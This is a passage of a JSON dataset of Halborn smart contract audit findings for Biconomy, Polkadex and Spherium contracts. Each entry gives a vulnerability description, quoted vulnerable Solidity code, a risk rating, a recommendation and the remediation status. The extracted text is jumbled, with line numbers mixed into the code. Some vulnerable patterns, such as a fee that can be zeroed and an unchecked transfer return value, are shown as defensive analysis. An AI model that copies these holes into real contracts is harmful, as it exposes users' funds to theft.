        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "According to the performed tests, it is possible to add the same executor to the executors array multiple times. Adding the same address to the executor array does not pose a security risk since the remove function works properly. However, it is the best practice to keep unique elements in executors array. Code Location: Listing 14: ExecutorManager.sol require ( executorAddress != address (0) , \" executor address 37 function addExecutor ( address executorAddress ) public override  onlyOwner { 38  can not be 0 \"); 39 40 41 42 executors . push ( executorAddress ); executorStatus [ executorAddress ] = true ; emit ExecutorAdded ( executorAddress , msg . sender ); } Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to implement an additional check to addExecutors func- tion. Other possible solution would be defining the executors array as a mapping. 35 Remediation Plan: SOLVED: This finding was solved after a sanity check was added to the code to check not to add duplicate records to the array. Commit ID: e15fffa2aa3c79a9b2729a7e081737856a632317 36 3.10 (HAL-10) USE OF SEND PATTERN INSTEAD OF CALL.VALUE - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Biconomy_Hyphen_V2",
            "Severity: Informational"
        ]
    },
    {
        "title": "IMPROPER KEY MANAGEMENT POLICY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf",
        "body": "The very basics of Blockchain is decentralization which should be applied as much as possible in all processes around Blockchain, such as key management. If a single private key is used to manage control over the smart contract and perform some actions such as deploy or upgrade a Smart However if some how the private key has been compromised, Contract. For example, on March 5, it could lead to devastating consequences. 2021, the PAID Network smart contract was attacked, regardless of the smart contract was audited before. Approximately $100 million of PAID token were extracted by the attacker. In that case, the private key was compromised and the attacker had successfully upgraded and replaced the original smart contract with a malicious version that allowed tokens to be burned and minted. Thus, if best practices had been implemented in the key management policy, the attacked could not upgrade the contract using a single private key because it needed one more key to perform any action over the contract with a multi-signature implementation. Including multi- signature in the key management policy avoid that any critical action over the contract can be performed by a single user. Reference: https://halborn.com/explained-the-paid-network-hack-march-2021/ Risk Level: Likelihood - 5 Impact - 5 Recommendations: It is recommended to include multi-signature in the key management policy in order to avoid the risk of losing control over the smart contract because of the private key being compromised. 13 Remediation Plan: After reviewing the findings and associated risks, Polkadex team doesnt consider necessary to use a multi-signature wallet for key management policy and they will store the deployers private key in a hardware wallet. 14 ",
        "labels": [
            "Halborn",
            "Polkadex_SmartContract_Halborn",
            "Severity: Critical"
        ]
    },
    {
        "title": "IMPROPER ROLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf",
        "body": "In smart contracts, implementing a correct Access Control policy is an essential step to maintain security and decentralization for permissions on a token. All the features of the smart contract , such as mint/burn tokens and pause contracts are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless,other authorization levels are required to follow the principle of least privilege, also known as least authority. Briefly, any process, user or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. Therefore, there could be multiple roles such as manager, minter, admin, or pauser in contracts which use a proxy contract. In dex.sol contract, Owner is the only one privileged role. Owner can transfer the contract ownership, call selfdestruct function and disable transfers of the token. In conclusion, owner role can do too many actions in Polkadex smart contract. So, if the private key of the owner account is compromised and multi-signature was not implemented, the attacker can perform many actions such as transferring ownership or destruct the contract without following the principle of least privilege. Code Location: Owner role can access below functions: dex.sol Lines #34-36 15 dex.sol Lines #38-40 dex.sol Lines #46-48 Risk Level: Likelihood - 4 Impact - 4 Recommendation: Its recommended to use role-based access control based on the principle of least privilege to lock permissioned functions using different roles. Reference: https://www.cyberark.com/what-is/least-privilege/ Remediation Plan: Polkadex team removed the privileged functions DestructToken() and disable () in their last commit c00b1ed5d53b27f02f29cb37777bd494eb5b9c21. The only privileged function left is TransferOwnerShip. Then, the issue was 16 solved. 17 ",
        "labels": [
            "Halborn",
            "Polkadex_SmartContract_Halborn",
            "Severity: High"
        ]
    },
    {
        "title": "USE OF SELFDESTRUCT FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf",
        "body": "After the Parity Bug incident in 2017, the use of the selfdestruct func- tion began to stop being used. In addition, if selfdestruct function is implemented in a smart contract without a proper access control pol- icy, any attacker can self-destruct the contract if the private key is compromised. References: - https://swcregistry.io/docs/SWC-106 - SEC554: How to lose $280 million with a single line of code Code Location: dex.sol Line #35 Risk Level: Likelihood - 3 Impact - 5 Recommendations: It is recommended not to use the selfdestruct function. If the use of this function is absolutely necessary, a multi-signature address will be required to approve the action of self destruct the contract and one role can only execute this action. 18 Remediation Plan: Polkadex team removed the DestructToken() function in their last commit c00b1ed5d53b27f02f29cb37777bd494eb5b9c21. 19 ",
        "labels": [
            "Halborn",
            "Polkadex_SmartContract_Halborn",
            "Severity: High"
        ]
    },
    {
        "title": "NO TEST COVERAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf",
        "body": "Unlike other software programs, smart contracts can not be modified or removed if deployed once into a specific address except if you deploy Checking the code by automated testing them with a proxy contract. (unit testing or functional testing) is a good practice to be sure all lines of the code work correctly. Mocha and Chai are useful tools to perform unit test in Smart Contracts functions. Mocha is a Javascript testing framework for creating both synchronous and asynchronous unit tests. Moreover, Chai is an assertions library with some interfaces such as assert, expect and should to develop custom unit tests. References: - https://github.com/mochajs/mocha - https://github.com/chaijs/chai - https://docs.openzeppelin.com/learn/writing-automated-tests Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended considering to perform as much as possible test cases to cover all possible scenarios in the smart contract. Remediation Plan: Pending: Polkadex team will include test cases in future release. 20 ",
        "labels": [
            "Halborn",
            "Polkadex_SmartContract_Halborn",
            "Severity: Medium"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf",
        "body": "Polkadex contract uses the floating pragma 0.7.6. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma version that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. Code Location: dex.sol Line #~1 Reference: ConsenSys Diligence - Lock pragmas Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider lock the pragma version known bugs for the compiler version. Therefore, it is recommended not to use floating pragma in the produc- tion.. Apart from just locking the pragma version in the code, the caret () need to be removed. it is possible locked the pragma fixing the version both in truffle-config.js if you use the Truffle framework and 21 in hardhat.config.js if you use HardHat framework for the deployment. Remediation plan: Solved: c00b1ed5d53b27f02f29cb37777bd494eb5b9c21. Polkadex locked team the pragma in their last commit 22 ",
        "labels": [
            "Halborn",
            "Polkadex_SmartContract_Halborn",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.NUMBER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf",
        "body": "During a manual static review, the tester noticed the use of block.number. Sometimes, Contract developers should be aware that using block.timestamp and block.number does not mean current time. block.number can be also influenced (to a lesser extent) by miners, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Code Location: dex.sol Line #12 dex.sol Line #23 Risk Level: Likelihood - 1 Impact - 2 23 Recommendation: If possible, it is recommended to use oracles instead of block.number as a source of entropy and random number. Remediation Plan: Solved: timescales will occur across 3 months rather than seconds. In this case, the use of block.number is safe since their ",
        "labels": [
            "Halborn",
            "Polkadex_SmartContract_Halborn",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf",
        "body": "Polkadex contract uses one of the latest pragma version (0.7.6) which The latest pragma version is was released back in December 16, 2020. (0.8.2) and it was released in March 2021. Many pragma versions have been lately released, going from version 0.6.x to the recently released version 0.8.x. in just 6 months. Reference: https://github.com/ethereum/solidity/releases Code Location: dex.sol Line #2 24 Risk Level: Likelihood - 1 Impact - 2 Recommendation: In the Solitidy Github repository, there is a json file describe all bugs reported for each compiler versions. No bugs have been found in > 0.7.3 versions but very few in 0.7.0 -- 0.7.3. So, the latest stable version is pragma 0.6.12. Furthermore, pragma 0.6.12 is widely used by Solidity developers and has been extensively tested in many security audits. Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_ by_version.json Remediation Plan: Polkadex team accepts the use of pragma version 0.7.6. 25 ",
        "labels": [
            "Halborn",
            "Polkadex_SmartContract_Halborn",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf",
        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: dex.sol Line #15 dex.sol Line #34 dex.sol Line #38 26 dex.sol Line #42 dex.sol Line #46 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions while external functions only can be accessed externally. Remediation Plan: Polkadex team considers proper the use of public functions in the smart contract. 27 ",
        "labels": [
            "Halborn",
            "Polkadex_SmartContract_Halborn",
            "Severity: Informational"
        ]
    },
    {
        "title": "DOCUMENTATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf",
        "body": "Documentation provided by Polkadex team is not complete. For instance, the documentation included in the GitHub repository should include a walkthrough to deploy and test the smart contracts. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider updating the documentation in Github for greater ease when contracts are deployed and tested. Have a Non-Developer or QA resource work through the process to make sure it addresses any gaps in the set-up steps due to technical assumptions. Remediation Plan: Pending: Polkadex team will include documentation in future release. 28 3.10 STATIC ANALYSIS REPORT ",
        "labels": [
            "Halborn",
            "Polkadex_SmartContract_Halborn",
            "Severity: Informational"
        ]
    },
    {
        "title": "USERS CAN MANIPULATE THE TRANSFER FEE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The _feeTransferHandler function calculates gas charge for transfers. It uses the following mathematical operation to calculate the charge: Listing 1 1 tokenGasPrice . mul ( executionGas ). mul ( feeMultiplier ). div (10000) ; According to this function, the charge result could be 0 if users supply one of the tokenGasPrice, executionGas or feeMultiplier values as 0 while using the external transfer() function. Also, it is not possible to manipulate feeMultiplier variable to 0 without having admin privileges. In addition, it is not possible to manipulate executionGas variable since it is using the gasleft() function second time while calculating the executionGas variable. However. Any user can set tokenGasPrice variable to 0 while using the transfer() function. As a result, the charge will be zero since 0.mul(executionGas).mul(feeMultiplier).div(10000) equals to 0 and token will not be charged during the transfer. Code Location: Listing 2: TransferHandlerCustom.sol (Lines 193) 191 function _feeTransferHandler ( uint256 tokenGasPrice , address _payer , address token , uint256 executionGas ) internal returns ( uint256 charge ){ 192 193 194 195 // optional checks if token is allowed could be added charge = tokenGasPrice . mul ( executionGas ). mul ( feeMultiplier ). div (10000) ; // Needs safe transfer from to support USDT SafeERC20 . safeTransferFrom ( IERC20 ( token ) , _payer , feeReceiver , charge ) SafeERC20 . safeTransferFrom ( IERC20 ( token ) , _payer , feeReceiver , charge ); 13 196 197 198 199 200 } /* require ( IERC20 ( token ) . transferFrom ( _payer , feeReceiver , charge )) ; */ Recommendation: There is a pre-flight check for controlling the tokenGasPrice variable on the JS side. However, these controls are also should be applied to the related contract. It is recommended to implement a zero value check to the control for validating the tokenGasPrice variable. Remediation Plan: SOLVED: Biconomy Team implemented an additional security check which interacts with the Price Oracle. This new check controls the tokenGasPrice value if tokenGasPrice is 0 or not. It has been observed that this new implementation resolved the issue. 14 ",
        "labels": [
            "Halborn",
            "Biconomy_TransferHandler",
            "Severity: Medium"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The Owner of the contract is usually the account that deploys the contract. As a result, the Owner is able to perform some privileged functions like In the TransferHandlerCustom. setFeeReceiver(), setBaseGas() and etc. sol smart contract, the renounceOwnership function is used to renounce the Owner permission. Renouncing ownership before transferring would result in the contract having no Owner, eliminating the ability to call privileged functions. Risk Level: Likelihood - 3 Impact - 3 Code Location: Listing 3: TransferHandlerCustom.sol Ownable (Lines 12) 12 contract TransferHandlerCustom is EIP712MetaTransaction ( \" ERC20Transfer \" ,\" 1\" ) , Ownable { 13 14 ... Recommendation: It is recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. 15 Listing 4: Disable RenounceOwnership (Lines 1) 1 2 3 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \" ); // not possible with this smart contract } Remediation Plan: SOLVED: Biconomy Team replaced the default Ownable.sol library with the customized RenounceOwnership function. It has been confirmed by the Halborn Team that this vulnerability has been fixed. OwnableWithoutRenounce.sol eliminated library and 16 ",
        "labels": [
            "Halborn",
            "Biconomy_TransferHandler",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CHECK ON CONSTRUCTOR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "For The TransferHandlerCustom.sol contract includes an Owner role. It is very example, the Owner role can change the baseGas value. Also, the Owner important to provide valid addresses to this role. role should be driven by people. There are too many address checks in the TransferHandlerCustom contract to keep this role safe. For example, it is not possible to set Owner or FeeReceiver addresses to address(0) after initialization of the contract. However, it is possible to set Owner address to address(0) because of the lack of address control on constructor. Risk Level: Likelihood - 2 Impact - 3 Code Location: Listing 5: TransferHandlerCustom.sol (Lines 54) 54 constructor ( address _owner ) public Ownable ( _owner ){ 55 } Recommendation: It is recommended to implement zero address check on constructor. 17 Remediation Plan: SOLVED: Biconomy Team solved this issue by implementing new zero address checks on the constructor. It is not possible to set owner or feeReceiver to address(0) anymore. It has been confirmed by the Halborn Team that this vulnerability has been fixed. 18 ",
        "labels": [
            "Halborn",
            "Biconomy_TransferHandler",
            "Severity: Low"
        ]
    },
    {
        "title": "IMPROPER IMPLEMENTATION OF FEE RECEIVER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Roles are used on the developed contracts to provide ease of use or to separate the tasks on the contract from each other. It is very important that these roles should be sharply separated from each other during the deployment phase of the contract and assigned to the right accounts. In some cases, unexpected conditions may occur as a result of incorrect programming of these roles. During the tests, it was seen that the Fee Receiver role on the TransferHandlerCustom.sol contract was not initialized on the constructor while deploying the contract. As a result of this situation, there will be no feeReceiver address on the contract and transactions will not be performed. Code Location: Listing 6: TransferHandlerCustom.sol (Lines 54) 54 constructor ( address _owner ) public Ownable ( _owner ){ 55 } Recommendation: It is recommended to implement the following code for the fees: Listing 7: TransferHandlerCustom.sol (Lines 54,55) 54 constructor ( address _owner , address _feeReceiver ) public Ownable ( _owner ){ require ( _feeReceiver != address (0) , 55 56 19 57 58 59 60 } \" Transfer Handler : the fee receiver can not be a zero address \" ); feeReceiver = _feeReceiver ; Remediation Plan: SOLVED: It has been confirmed by the Halborn Team that this vulnerability has been fixed due to the Biconomy Team applied the recommendation on the constructor. 20 ",
        "labels": [
            "Halborn",
            "Biconomy_TransferHandler",
            "Severity: Low"
        ]
    },
    {
        "title": "EXPERIMENTAL FEATURES ENABLED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "ABIEncoderV2 is enabled and the use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(...) as arguments in external function calls or in event data without prior assignment to a local variable. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Risk Level: Likelihood - 1 Impact - 2 Code Location: Listing 8: TransferHandlerCustom.sol (Lines 3) 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.0; 3 pragma experimental ABIEncoderV2 ; Recommendation: When possible, do not use experimental features in the final live deployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). 21 Remediation Plan: SOLVED: Biconomy Team solved this issue by removing pragma experimental ABIEncoderV2 from the contract. It has been confirmed by the Halborn Team that this vulnerability has been fixed. 22 ",
        "labels": [
            "Halborn",
            "Biconomy_TransferHandler",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The TransferHandlerCustom.sol contract uses one of the newest pragma versions (0.8.0), which was released on March 10, 2020. Since this version is not one of the generally used reliable versions, we do not recommend using it. It is recommended to use an older but secure version, as this version is a newer version and there may still be new security vulnerabilities on it. Code Location: Listing 9: TransferHandlerCustom.sol (Lines 2) 2 pragma solidity 0.8.0; Recommendation: In the Solidity Github repository, there is a json file listing the bugs reported for each compiler version. A security vulnerability has been found in the pragma version 0.7.6. The latest stable version is pragma 0.6.12. Furthermore, pragma 0.6.12 is widely used by Solidity developers and has been extensively tested in many security audits. We recommend using the latest stable version. Please check the list below: https://github.com/ethereum/solidity/blob/develop/docs/bugs_by_version. json Remediation Plan: ACKNOWLEDGED: Biconomy Team decided to continue using pragma 0.8.0 and accepts the risk. 23 ",
        "labels": [
            "Halborn",
            "Biconomy_TransferHandler",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING EVENTS EMITTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "It has been observed that critical functionality is missing emitting event for setDefaultFeeMultiplier and setFeeReceiver functions. These functions should emit events after completing the transactions. Risk Level: Likelihood - 1 Impact - 1 Code Location: Listing 10: TransferHandlerCustom.sol 57 function setDefaultFeeMultiplier ( uint16 _bp ) external onlyOwner { 58 require ( _bp <= maximumMarkup , \" fee multiplier is too high \" ); feeMultiplier = _bp ; 59 60 } Listing 11: TransferHandlerCustom.sol 62 function setFeeReceiver ( address _feeReceiver ) external onlyOwner { 63 64 65 _feeReceiver != address (0) , \" Transfer Handler : new fee receiver can not be a zero require ( address \" ); feeReceiver = _feeReceiver ; 66 67 68 } 24 Recommendation: Consider emitting an event when calling setDefaultFeeMultiplier and setFeeReceiver functions. Listing 12 1 event setDefaultFeeMultiplier ( uint16 _bp ); 2 event setFeeReceiver ( address _feeReceiver ); Remediation Plan: SOLVED: Biconomy Team solved this issue by implementing new events and emitting these events on the necessary functions. It has been seen by the Halborn team that the specified vulnerability has been fixed. 25 ",
        "labels": [
            "Halborn",
            "Biconomy_TransferHandler",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In contract SpheriumRouter01.sol and SpheriumRouter02.sol the return val- ues of an external transfer call ISpheriumPair(pair).transferFrom(msg. sender, pair, liquidity) is not checked. It should be noted that token do not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location: Listing 2: periphery-bsc/contracts/SpheriumRouter01.sol (Lines 108) 98 99 100 101 102 103 104 105 106 107 108 109 110 function removeLiquidity ( address tokenA , address tokenB , uint liquidity , uint amountAMin , uint amountBMin , address to , uint deadline ) public override ensure ( deadline ) returns ( uint amountA , uint amountB ) { address pair = SpheriumLibrary . pairFor ( factory , tokenA , tokenB ); ISpheriumPair ( pair ). transferFrom ( msg . sender , pair , liquidity ); // send liquidity to pair ( uint amount0 , uint amount1 ) = ISpheriumPair ( pair ). burn ( to ); ( address token0 ,) = SpheriumLibrary . sortTokens ( tokenA , tokenB ); Listing 3: periphery-bsc/contracts/SpheriumRouter02.sol (Lines 126) 116 117 function removeLiquidity ( address tokenA , 16 118 119 120 121 122 123 124 125 126 127 address tokenB , uint liquidity , uint amountAMin , uint amountBMin , address to , uint deadline ) public virtual override ensure ( deadline ) returns ( uint amountA , uint amountB ) { address pair = SpheriumLibrary . pairFor ( factory , tokenA , tokenB ); ISpheriumPair ( pair ). transferFrom ( msg . sender , pair , liquidity ); // send liquidity to pair ( uint amount0 , uint amount1 ) = ISpheriumPair ( pair ). burn ( to ); Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to use SafeERC20, or ensure that the transfer return value is checked. Remediation Plan: SOLVED: solved d87fb122b5d168ee90a324c1a1e664e3019caf. Spherium team The the issue in commit 64 17 ",
        "labels": [
            "Halborn",
            "Spherium_Hyperswap",
            "Severity: Medium"
        ]
    },
    {
        "title": "MANIPULATION OF INITIAL TOKEN ADDRESSES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "a it was manual review, observed contract During SpheriumPair.sol allows a factory user to initialize token0 and token1 at any time by making an external call. Malicious activity can be done to manipulate the functions within the contract i.e. sync, skim, swap, burn, and mint and the intended operation can be bypassed because all these functions has a dependency on token0 and token1. core-bsc that Code Location: Malicious initialization of token0 and token1 at anytime by factory. Listing 4: core-bsc/contracts/SpheriumPair.sol (Lines 67,69,70) 62 63 64 65 66 67 68 69 70 71 constructor () public { factory = msg . sender ; } // called once by the factory at time of deployment function initialize ( address _token0 , address _token1 ) external { require ( msg . sender == factory , ' Spherium : FORBIDDEN '); // sufficient check token0 = _token0 ; token1 = _token1 ; } Affected token transfer, mint, balance update, and burn Listing 113,114,139,140,149,150,151,152,171,172,174,175,194,195,200) core-bsc/contracts/SpheriumPair.sol 5: (Lines 111 function mint ( address to ) external lock returns ( uint liquidity ) { 18 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 ( uint112 _reserve0 , uint112 _reserve1 ,) = getReserves () ; // gas savings uint balance0 = IERC20 ( token0 ). balanceOf ( address ( this )); uint balance1 = IERC20 ( token1 ). balanceOf ( address ( this )); uint amount0 = balance0 . sub ( _reserve0 ); uint amount1 = balance1 . sub ( _reserve1 ); bool feeOn = _mintFee ( _reserve0 , _reserve1 ); uint _totalSupply = totalSupply ; // gas savings , must be defined here since totalSupply can update in _mintFee if ( _totalSupply == 0) { liquidity = Math . sqrt ( amount0 . mul ( amount1 )) . sub ( MINIMUM_LIQUIDITY ); _mint ( address (0) , MINIMUM_LIQUIDITY ); // permanently lock the first MINIMUM_LIQUIDITY tokens } else { liquidity = Math . min ( amount0 . mul ( _totalSupply ) / _reserve0 , amount1 . mul ( _totalSupply ) / _reserve1 ); } require ( liquidity > 0, ' Spherium : INSUFFICIENT_LIQUIDITY_MINTED '); _mint ( to , liquidity ); _update ( balance0 , balance1 , _reserve0 , _reserve1 ); if ( feeOn ) kLast = uint ( reserve0 ). mul ( reserve1 ); // reserve0 and reserve1 are up - to - date emit Mint ( msg . sender , amount0 , amount1 ); } // this low - level function should be called from a contract which performs important safety checks function burn ( address to ) external lock returns ( uint amount0 , uint amount1 ) { ( uint112 _reserve0 , uint112 _reserve1 ,) = getReserves () ; // gas savings address _token0 = token0 ; // gas savings address _token1 = token1 ; // gas savings uint balance0 = IERC20 ( _token0 ). balanceOf ( address ( this )) ; uint balance1 = IERC20 ( _token1 ). balanceOf ( address ( this )) ; uint liquidity = balanceOf [ address ( this ) ]; bool feeOn = _mintFee ( _reserve0 , _reserve1 ); 19 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 uint _totalSupply = totalSupply ; // gas savings , must be defined here since totalSupply can update in _mintFee amount0 = liquidity . mul ( balance0 ) / _totalSupply ; // using balances ensures pro - rata distribution amount1 = liquidity . mul ( balance1 ) / _totalSupply ; // using balances ensures pro - rata distribution require ( amount0 > 0 && amount1 > 0, ' Spherium : INSUFFICIENT_LIQUIDITY_BURNED '); _burn ( address ( this ) , liquidity ); _safeTransfer ( _token0 , to , amount0 ); _safeTransfer ( _token1 , to , amount1 ); balance0 = IERC20 ( _token0 ). balanceOf ( address ( this )) ; balance1 = IERC20 ( _token1 ). balanceOf ( address ( this )) ; _update ( balance0 , balance1 , _reserve0 , _reserve1 ); if ( feeOn ) kLast = uint ( reserve0 ). mul ( reserve1 ); // reserve0 and reserve1 are up - to - date emit Burn ( msg . sender , amount0 , amount1 , to ); } // this low - level function should be called from a contract which performs important safety checks function swap ( uint amount0Out , uint amount1Out , address to , bytes calldata data ) external lock { require ( amount0Out > 0 || amount1Out > 0, ' Spherium : INSUFFICIENT_OUTPUT_AMOUNT '); ( uint112 _reserve0 , uint112 _reserve1 ,) = getReserves () ; // gas savings require ( amount0Out < _reserve0 && amount1Out < _reserve1 , ' Spherium : INSUFFICIENT_LIQUIDITY '); uint balance0 ; uint balance1 ; { // scope for _token {0 ,1} , avoids stack too deep errors address _token0 = token0 ; address _token1 = token1 ; require ( to != _token0 && to != _token1 , ' Spherium : INVALID_TO '); if ( amount0Out > 0) _safeTransfer ( _token0 , to , amount0Out ) ; // optimistically transfer tokens if ( amount1Out > 0) _safeTransfer ( _token1 , to , amount1Out ) ; // optimistically transfer tokens if ( data . length > 0) ISpheriumCallee ( to ). spheriumCall ( msg . sender , amount0Out , amount1Out , data ); 20 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 balance0 = IERC20 ( _token0 ). balanceOf ( address ( this )) ; balance1 = IERC20 ( _token1 ). balanceOf ( address ( this )) ; } uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - ( _reserve0 - amount0Out ) : 0; uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - ( _reserve1 - amount1Out ) : 0; require ( amount0In > 0 || amount1In > 0, ' Spherium : INSUFFICIENT_INPUT_AMOUNT '); { // scope for reserve {0 ,1} Adjusted , avoids stack too deep errors uint balance0Adjusted = balance0 . mul (1000) . sub ( amount0In . mul (3) ); uint balance1Adjusted = balance1 . mul (1000) . sub ( amount1In . mul (3) ); require ( balance0Adjusted . mul ( balance1Adjusted ) >= uint ( _reserve0 ). mul ( _reserve1 ). mul (1000**2) , ' Spherium : K '); } _update ( balance0 , balance1 , _reserve0 , _reserve1 ); emit Swap ( msg . sender , amount0In , amount1In , amount0Out , amount1Out , to ); } // force balances to match reserves function skim ( address to ) external lock { address _token0 = token0 ; // gas savings address _token1 = token1 ; // gas savings _safeTransfer ( _token0 , to , IERC20 ( _token0 ). balanceOf ( address ( this )) . sub ( reserve0 )) ; _safeTransfer ( _token1 , to , IERC20 ( _token1 ). balanceOf ( address ( this )) . sub ( reserve1 )) ; } // force reserves to match balances function sync () external lock { _update ( IERC20 ( token0 ). balanceOf ( address ( this )) , IERC20 ( token1 ). balanceOf ( address ( this )) , reserve0 , reserve1 ); 201 202 } } 21 Risk Level: Likelihood - 1 Impact - 4 Recommendation: It is recommended to move the initialization of token0 and token1 to constructor() so that it can be called once at the time of deployment by the contract owner. In case to continue with the initialize function, it is recommended to declare the initialize function as internal and the function call should be done within constructor(). Remediation Plan: NOT APPLICABLE: The Spherium team claims that factory contract can initialize the token0 and token1, but it cannot change the token0 and token1 variables for the second time. 22 ",
        "labels": [
            "Halborn",
            "Spherium_Hyperswap",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
